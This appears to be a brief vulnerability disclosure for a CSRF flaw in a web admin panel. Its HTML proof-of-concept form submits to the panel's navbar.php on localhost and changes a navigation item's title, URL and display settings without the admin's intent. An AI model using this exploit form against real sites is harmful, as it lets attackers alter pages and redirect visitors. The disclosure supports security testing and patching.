# Navbar CSRF
Allows for the navbar to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<div class="modal-body">

<form method="POST" action="http://localhost/admin/navbar.php">
  <h4 class="modal-title" id="myModalLabel">Editing <b>google</b> Navbar Item</h4>
    <input type="hidden" name="id" value="1">
    <div class="form-group">
      <label for="title">URL Title</label>
      <input type="text" class="form-control" id="title" name="title" value="google">
    </div>
    <div class="form-group">
      <label for="url">URL</label>
      <input type="text" class="form-control" id="url" name="url" value="https://google.com">
    </div>
    <div class="form-group">
      <label for="newpage">Open URL in new page</label>
      <select class="form-control" id="newpage" name="newpage">
        <option value="1">Current - Do Not Change</option>
        <option value="1">Yes</option>
        <option value="0">No</option>
      </select>
    </div>
    <div class="form-group">
      <label for="order">Order</label>
      <input type="text" class="form-control" id="order" name="order" value="1">
    </div>
    <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
</div>

</form>
```
